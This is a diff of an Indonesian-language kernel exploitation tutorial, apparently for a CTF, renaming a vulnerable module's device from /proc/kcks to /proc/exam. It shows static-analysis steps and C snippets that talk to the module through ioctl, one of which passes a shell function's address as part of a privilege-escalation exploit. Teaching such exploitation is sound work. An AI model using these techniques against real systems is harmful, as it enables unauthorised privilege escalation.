@@ -88,10 +88,10 @@ Kemudian jalankan file launch.sh seperti biasa yaitu `./launch.sh`
 
 Dari extract initramfs akan didapatkan file .ko --> buka di IDA/Ghidra 
 Informasi penting yang harus didapatkan selama static analysis :
-- nama device yang digunakan untuk berkominkasi apa, misal proc_create("kcks") maka /proc/kcks
+- nama device yang digunakan untuk berkominkasi apa, misal proc_create("exam") maka /proc/exam
 - dapatkan vuln nya, pada level easy biasanya vuln terdapat pada ioctl, paham code pada fungsi ioctl.
 
-Berikut adalah screenshot IDA ketika me-decompile fungsi init_module, diketahui bahwa kernel module dibuat dengan fungsi proc_create() dengan nama `kcks` maka kita bisa berkomunikasi dengan kernel module tersebut pada file /proc/kcks.
+Berikut adalah screenshot IDA ketika me-decompile fungsi init_module, diketahui bahwa kernel module dibuat dengan fungsi proc_create() dengan nama `exam` maka kita bisa berkomunikasi dengan kernel module tersebut pada file /proc/exam.
 
 ![IDA](./img/prockcks.jpg)
 
@@ -99,7 +99,7 @@ Berikut adalah screenshot IDA ketika me-decompile fungsi init_module, diketahui 
 
 ### Dynamic Analysis
 
-Buatlah file .c yang akan berkomunikasi dengan kernel module. berikut adalah sepotong c code yang digunakan untuk berkomunikasi dengan kernel module /proc/kcks dengan ioctl :
+Buatlah file .c yang akan berkomunikasi dengan kernel module. berikut adalah sepotong c code yang digunakan untuk berkomunikasi dengan kernel module /proc/exam dengan ioctl :
 ```c
 #include <stdio.h>
 #include <fcntl.h>
@@ -116,11 +116,11 @@ int main(){
  req_userland uland;
  int fd;
  /*
- // pastikan nama devicenya sama dengan static analysis, disini kita menggunakan /proc/kcks
- // dikarenakan pada fungsi init_module dia memanggil fungsi proc_create("kcks", 00, 00)
+ // pastikan nama devicenya sama dengan static analysis, disini kita menggunakan /proc/exam
+ // dikarenakan pada fungsi init_module dia memanggil fungsi proc_create("exam", 00, 00)
  // jika pada init_module memanggil proc_create("tes", 00, 00) maka kita gunakan /proc/tes
  */
- fd = open("/proc/kcks",O_RDWR);  
+ fd = open("/proc/exam",O_RDWR);  
  uland.address = 0x41414141;
  ioctl(fd, 0, &uland);
  return 0;
@@ -247,7 +247,7 @@ typedef struct req_userland{
 int main(){
   int fd;
   req_userland uland;
-  fd = open("/proc/kcks",O_RDWR);
+  fd = open("/proc/exam",O_RDWR);
   uland.address = &shell;
   printf("addres uland @ 0x%x\n", &uland);
   printf("value of uland 0x%x \n", uland);
